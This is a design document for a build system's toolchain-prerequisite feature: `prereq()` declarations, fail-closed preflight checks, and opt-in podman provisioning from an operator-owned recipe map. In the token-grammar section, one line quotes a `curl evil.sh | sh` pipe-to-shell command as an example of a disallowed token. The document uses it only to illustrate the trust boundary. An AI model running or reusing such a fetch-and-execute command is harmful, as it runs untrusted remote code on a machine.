# Build prerequisites and provisioning — `prereq()`, preflight, and podman layering

Status: **partially IMPLEMENTED** (the host-install, no-container path). Built on
`feat/win-axis2-orchestrator`, cross-platform-verified (Linux + the winbaz MINGW
box):
- `build.prereq(b, "<tc>:<ver>")` declaration (used bare via `import build
  (prereq)`); `tools/extract-deps --prereqs` collects them; the set flattens
  transitively over the dep DAG.
- `aeb --prereqs <target>` — list the OS-agnostic token set.
- `aeb --preflight <target>` — probe vs host, `unmet-prereqs: [...]` verdict
  (exit 3), fail-closed default. (`lib/provision`.)
- `aeb --install-prereqs <target>` — **dry-run** host install recipes (token →
  per-OS package name / pinned tarball; `_detect_pm` + `_pkg_name` + `_os_slug`).
  Nothing executes yet — `--execute` is the deferred follow-up.

Still design-only below this point: the podman-layering `provision` phase (§Phase
2), `ping`-advertised token routing (§Routing), and the pluck-into-base-layer
optimization. NB: the implemented `--install-prereqs` targets the HOST directly
(no container) — the opt-in *podman* provisioning is the unbuilt Ring B/C part.

Original design follows. Motivated by a real monorepo with huge per-leaf
toolchain variance (skir — `~/scm/skir`). Sits in
[`directions.md`](directions.md)'s **Ring B/C** (podman provisioning needs
podman, so it is never Ring A; the host-install path IS Ring-A-safe) and
composes with [`build-veto-and-sandbox.md`](build-veto-and-sandbox.md)
(provisioning adds *capability*, never *trust* — see "Provisioning is not
trust").

## The motivating problem (skir)

skir is a schema→bindings generator: ~27 leaves, of which
`bindings/{rust,go,java,kotlin,dart,csharp,swift,gleam,zig,moonbit,cpp,python,
typescript}` each need **that language's entire system toolchain** (`rustc`,
`go`, a JDK, `kotlinc`, `dart`, `dotnet`, `swiftc`, `gleam`, `zig`, `moonbit`,
`g++`, `python`, `node`). A vanilla `aeb-agent` has almost none of them. Today
`bindings/zig/.build.ae` just calls `zig.build_pkg` → `zig: not found` → a
**build failure** that can't be told apart from "the code is broken."

Three requirements fall out:

1. A leaf must be able to **declare** its system-dep requirements — *without
   that being automatic*. By default a missing prerequisite is a **clean,
   attributable failure**, never silently provisioned.
2. A vanilla agent with the toolchain absent **fails with a distinct verdict**
   (`unmet-prereqs`), not a confusing build error.
3. An agent **with podman and explicit operator opt-in** can **layer the
   missing toolchains onto its base image** so a *subsequent* clone/fetch +
   `aeb build <target>` passes.

## The core idea: prerequisites are a DAG, exactly like `dep()`

aeb's `build.dep("path/.build.ae")` already builds a DAG that flattens to a
topo-ordered visit list, scanned statically by `tools/extract-deps` (greppable,
no evaluation). **`prereq(...)` reuses that machinery** — same shape, but the
leaves are **toolchain tokens, not build files:**

```aether
// bindings/zig/.build.ae
main() {
    b = build.start()
    dep(b, "generators/zig/.build.ae")   // existing build edge
    prereq(b, "zig:0.13")                 // NEW: a toolchain prerequisite
    ...
    zig.build_pkg(b) { output("skir-zig-smoke") }
}
```

Two properties inherited from `dep()` for free, both load-bearing:

- **Statically extractable.** `prereq(...)` lines are greppable like
  `build.dep(...)`; `tools/extract-deps` learns to collect them. This matters
  because **provisioning must know the requirement *before* it can build the
  layer** — you can't run the leaf to discover what it needs (chicken-and-egg).
  `prereq` is data, not procedure.
- **Transitive union over the dep DAG.** A `prereq` declared on a *shared*
  node propagates to every consumer. `generators/python/.build.ae` declares
  `prereq("python:3.14")`; every `bindings/*` that `dep`s it inherits that
  prerequisite without restating it. The dep DAG **is** the propagation
  mechanism — the prerequisite set of a target is the union of `prereq` tokens
  over its whole transitive dep closure.

### The flattened set

```
target → walk its dep DAG → collect every prereq(...) token
       → dedupe → the PREREQUISITE SET, e.g. {python:3.14, zig:0.13}
```

That set is the single artifact both phases below consume.

## Token grammar — `<toolchain>:<version>`

`"python:3.14"`, `"zig:0.13"`, `"jdk:21"`. Properties:

- **Versioned, exact (v1).** `python:3.14` ≠ `python:3.12` — the version is
  part of the identity because a provisioned layer must be reproducible.
  Version *ranges* (`jdk:>=17`) are deferred: a range, if ever supported, must
  be **resolved to a concrete version before it enters the set**, so the set —
  and the layer it keys — stays exact.
- **A finite, operator-owned vocabulary.** A repo may `prereq("python:3.14")`;
  it may **not** `prereq("curl evil.sh | sh")` and have that become anything.
  An unknown/unmapped token is `unmet-prereqs` (a failure), **never** arbitrary
  provisioning. The repo declares *what*; the operator owns *how* and
  *whether* (see "Provisioning is not trust").

## The set feeds two phases — `preflight` (always) and `provision` (opt-in)

`prereq(x)` is the **declaration** (the noun). **preflight** and **provision**
are the two things done with the flattened set (the verbs) — the read-only
check and the act-on-it.

### Phase 1 — preflight (default, every agent, fail-closed)

Before building, the agent flattens the prereq set and **probes each token**
against the environment (`command -v zig`, `python --version` matches `3.14`,
…). If any is missing:

> **distinct verdict: `unmet-prereqs: [zig:0.13]`** — *not* `build-failed`.

This is the default and it **never provisions**. Same shape as the veto's
`vetoed`-vs-`failed` distinction: the originator can tell "this agent lacks
zig" from "your build ran and broke." A vanilla agent stops here, cleanly.

### Phase 2 — provision (only if `--allow-provision` + podman)

An agent the operator has configured with `--allow-provision` and a podman
runtime takes the **same flattened set** and, for the missing tokens, **builds
a layer on its base image** so the subsequent build finds the toolchain on
PATH:

```
aeb-agent-base  +  L(prereq set)  →  aeb-agent-<hash>:provisioned
                                     clone/fetch + aeb build <target> runs in it → passes
```

This is the inverse purpose of the `--with=<lang>` image work already proven
out for the hosted-language duality (most of these toolchains already have a
pinned-install recipe from that effort). The agent does the `podman build`;
the contained build just *finds* the toolchain.

## Canonicalisation: alpha-sort is for the cache **key**, not the layer **stack**

The set is order-independent, but the cache must treat `{python,zig}` and
`{zig,python}` as the same image. So:

> **Alpha-sort the set, hash it, and that is the image cache key**
> (`aeb-agent-<sha256(sorted)>`). Same prereq set → same key → cache hit,
> regardless of declaration order.

Alpha-sort lives **here and only here** — as the canonical serialisation for
identity. It is *not* the order layers are installed in. That was a tempting
conflation and it is wrong: alphabetical order is arbitrary w.r.t. (a) **install
correctness** (some toolchains must install before others, share `/usr/local`,
fight over apt state) and (b) **layer-cache reuse** (podman reuse is
prefix-based — a heavy stable toolchain sorted *after* a light volatile one gets
needlessly rebuilt on every bump). Determinism, install-correctness, and
cache-reuse are three *different* orderings; alpha-sort only satisfies the first.

## Layer structure: one combined layer now; pluck **select** ones later

"Order N independent toolchain layers correctly" is the hard problem (inter-
toolchain install coupling). **We don't solve it yet.**

### Default — one combined layer

The whole sorted set is installed by **one recipe** as a **single layer**, keyed
by `sha256(sorted-set)`. Correctness lives in the recipe (which knows how to
install zig + swift + jdk together, in the right order, sharing system state) —
**not** in any layer-ordering luck. A change to the set rebuilds the one fat
layer; for skir's "13 toolchains, changes rarely" that is the right trade: one
correct layer, rebuilt seldom, beats 13 fragile interacting ones. This is the
shipped-from-day-one shape because it has **no per-layer reasoning to get wrong.**

### Later optimization — pluck *select* prerequisites into a base layer

Once measured to matter, promote a **hand-picked few** prerequisites into their
own stable base layer *beneath* the combined one:

```
aeb-agent-base
  + L(plucked base set)   ← e.g. jdk:21, nodejs:20  — heavy + stable + install-clean alone
  + L(combined rest)      ← everything else, one recipe layer (rebuilt on churn)
```

The discipline that keeps this from reintroducing the hard problem: pluck
**only** tokens that are **(a) heavy + stable** (so caching them deep pays off
when the combined layer churns) **and (b) verified to install cleanly in
isolation** (so you are not ordering the *whole* set — just vouching for a
chosen few). Everything not plucked stays in the combined layer, where the
recipe still owns its interplay. Plucking is:

- a **pure performance optimization**, justified by observed rebuild cost, per-
  fleet, and reversible (drop a token back into the combined layer if it turns
  out to interact);
- **operator-owned** — the provision policy names base-layer-eligible tokens
  (`base_layer: [jdk, nodejs]`), defaulting to empty → everything combined. The
  repo never influences plucking; it only declares `prereq`s.

One line: **start with one correct combined layer; later pluck only the
heavy-stable-independent prerequisites down into a shared base — never split the
whole set, just the ones that have earned their own layer.**

## The operator-owned token → recipe map

The only genuinely new external artifact. A `lib/provision`-style map from a
prereq token to its **deterministic install recipe**:

- `zig:0.13` → fetch the pinned zig 0.13 tarball to `/usr/local`;
- `python:3.14` → the pinned python install;
- `jdk:21` → apt/upstream pinned JDK.

Properties:

- **Recipes must pin, not float** — `L(zig:0.13)` must produce a cache-key-
  stable layer or the content-addressing leaks. (The `--with=` recipes already
  built mostly fetch pinned tarballs / apt pinned versions — deterministic
  enough.)
- **aeb ships defaults for its SDK languages** (we already have most recipes
  from the `--with=`/hosted-language work); the operator can **override and
  extend**. Same dual-source pattern as the SDKs themselves.
- **Operator-owned = the trust boundary.** The repo's `prereq` token only
  *selects* a recipe from the operator's map; it cannot supply one. An
  unmapped token fails preflight; it never provisions.

### Cross-distro package names — the token is distro-agnostic, the recipe is not

A real wrinkle the token grammar deliberately hides: the same toolchain has
**different package names (and sometimes different install strategies) per
distro/package manager**. `jdk:21` is `openjdk-21-jdk` on Debian/`apt`,
`java-21-openjdk-devel` on Fedora/`dnf`, `openjdk21` on Alpine/`apk`. One
token, three names.

The design rule that keeps this from leaking: **the `prereq` token stays
distro-agnostic; distro-awareness lives entirely in the recipe.** The repo
declares `jdk:21` and must *never* learn whether the fleet runs Debian or
Alpine — that would drag the host environment up into the build graph, which
is exactly the coupling `prereq` exists to avoid. So the divergence is the
**recipe map's** problem, resolved three ways (in order of preference):

1. **Distro-invariant recipes — the preferred shape, no divergence at all.**
   A recipe that **fetches a pinned upstream tarball/installer to
   `/usr/local`** (`zig:0.13`, the standalone Python builds, the Temurin JDK
   tarball, the Go tarball) has *no* package manager in it, so the apt/rpm/apk
   question never arises. This is already how most `--with=` recipes work, and
   it is what the "recipes must pin, not float" rule pushes toward anyway. For
   a *single, controlled base image* (the recommended posture — the operator
   owns `aeb-agent-base`), most recipes can and should be this shape, and the
   cross-distro problem largely evaporates.

2. **Per-distro recipe map entries**, when a recipe genuinely wants the system
   package manager (the base build toolchain, glibc dev headers, a JDK the
   operator would rather get from apt). The recipe carries a small branch keyed
   by the base image's package manager, which provisioning detects once
   (`command -v apt-get || dnf || apk`):

   ```
   jdk:21 → {
     apt:  "apt-get install -y openjdk-21-jdk",
     dnf:  "dnf install -y java-21-openjdk-devel",
     apk:  "apk add openjdk21",
     # no branch for a PM → that distro is unsupported for this token →
     # provisioning fails closed (NOT a silent fallback to a wrong package)
   }
   ```

   Fail-closed is the discipline: a token whose recipe has **no branch for the
   base image's package manager** is an `unmet-prereqs`/unprovisionable error,
   never a guess at the package name.

3. **Pin the base image's distro per fleet.** The simplest operational answer:
   an `--allow-provision` fleet declares its base image (`aeb-agent-base` is
   *one* distro the operator chose), so the recipe map only ever needs the
   branch for *that* distro. Most operators run a single base; the per-distro
   map (2) is only needed by an operator deliberately spanning Debian *and*
   Alpine agents in one grid.

So: prefer tarball recipes (no PM, no divergence); where a recipe must use a
package manager, the map carries per-PM branches and fails closed on an
unmapped PM; and a single-distro base sidesteps the whole question. The token
the repo writes is invariant across all three.

## Routing: agents advertise held tokens

Provisioning gives the agent grid a routing primitive. An agent's `ping`
capability descriptor (see
[`run-policy-class-and-cloud-leverage.md`](run-policy-class-and-cloud-leverage.md))
advertises its **held** toolchain tokens (and, if `--allow-provision`, its
**provisionable** set — the keys of its recipe map). An originator dispatches a
target only where the target's flattened prereq set is a **subset** of the
agent's held-or-provisionable tokens — a subset check over two sorted lists.
This is the Jenkins-labels "which node can build this" story, computed from the
prereq DAG rather than hand-maintained labels.

## Provisioning is not trust

Critical boundary, stated so it is not blurred: **provisioning adds a
*capability* (the toolchain is now present); it does not grant *trust*.** A
provisioned image still runs the untrusted build under the
[`build-veto-and-sandbox.md`](build-veto-and-sandbox.md) layers — the veto
still inspects the `.ae` graph, the `spawn_sandboxed` profile still confines
the build's syscalls. Installing `zig` so a build *can* compile says nothing
about whether that build *should* be allowed to reach the network or shell out.
The two systems are orthogonal: prerequisites decide *can this build run at
all*; the veto/sandbox decide *what this build is permitted to do*.

## Where it sits in the rings ([`directions.md`](directions.md))

- **Ring A (the invariant):** unaffected. A lone-process `aeb` on a dev box
  with the toolchains already installed builds skir fine; `prereq()` declares,
  `preflight` confirms, nothing is provisioned. The sacred single-process,
  no-container floor never depends on any of this.
- **Ring B/C:** provisioning is the opt-in podman-layering convenience for the
  agent fleet. It **fails closed** without `--allow-provision` (degrades to
  preflight's clean `unmet-prereqs`), so it is purely additive — exactly the
  ring discipline.

## What to build, in order

1. **`prereq(b, "<toolchain>:<version>")`** — the `dep`-shaped, greppable
   declaration; extend `tools/extract-deps` to collect it; flatten over the dep
   DAG to the prerequisite set. *(the data)*
2. **preflight** — probe the set vs. the environment; missing → the distinct
   `unmet-prereqs` verdict; never provisions. *(the fail-closed default)*
3. **`ping` advertises held tokens** + the originator subset-routing. *(routing)*
4. **`--allow-provision` agent + the operator token→recipe map** — one combined
   layer keyed by `sha256(sorted set)`, built on `aeb-agent-base`, the
   subsequent clone+build run inside it. *(provisioning — opt-in, podman)*
5. **Later:** the *pluck-select-into-base-layer* optimization, when rebuild cost
   measured to justify it.

## Open edges (not yet decided)

- **Shared `src.fetch` with source-deps.** The pinned-tarball fetch a
  provisioning recipe uses is the same primitive a Gentoo-style *from-source
  dependency node* needs — see
  [`gentoo-style-src-deps.md`](gentoo-style-src-deps.md). A `.src.ae` could in
  fact *be* what a provisioning recipe builds (prereq = "have it installed",
  a source-dep = "build it here as a graph node"; same determinism goal, two
  grains). Build the fetch once, share it.
- **SDK-contributed prerequisites.** `zig.build_pkg` *inherently* needs `zig` —
  should `lib/zig` contribute `prereq("zig:…")` automatically when its builder
  is invoked (DRY across the fleet), or must each leaf restate it? skir's
  uniform-per-language leaves tolerate either; SDK-contributed is DRY-er but is
  a different mechanism (a builder injecting a prereq at scan time vs. a DAG
  node declaring one). Leaning SDK-contributed-primary, leaf-may-add.
- **Version ranges** (`jdk:>=17`) — deferred; if added, resolve to a concrete
  version *before* the set, to preserve the exact-version cache property.
- **Probe fuzziness.** "Is `python:3.14` present" is not crisp (system vs
  pyenv vs venv vs framework). The probe definition per toolchain is part of
  the recipe map, and a fuzzy/ambiguous probe should lean to **fail preflight**
  (fail-closed) rather than assume present.
- **Cross-distro recipe form.** Addressed above ("Cross-distro package
  names") — token stays distro-agnostic; recipe is tarball-preferred, else a
  per-PM (apt/dnf/apk) branch that fails closed on an unmapped manager, with
  single-distro-base as the simple out. Still to settle: whether the
  per-distro map is keyed by detected package manager (apt/dnf/apk) or by a
  declared base-image id, and whether aeb's shipped default recipes commit to
  one base distro or carry the multi-PM branch from day one.
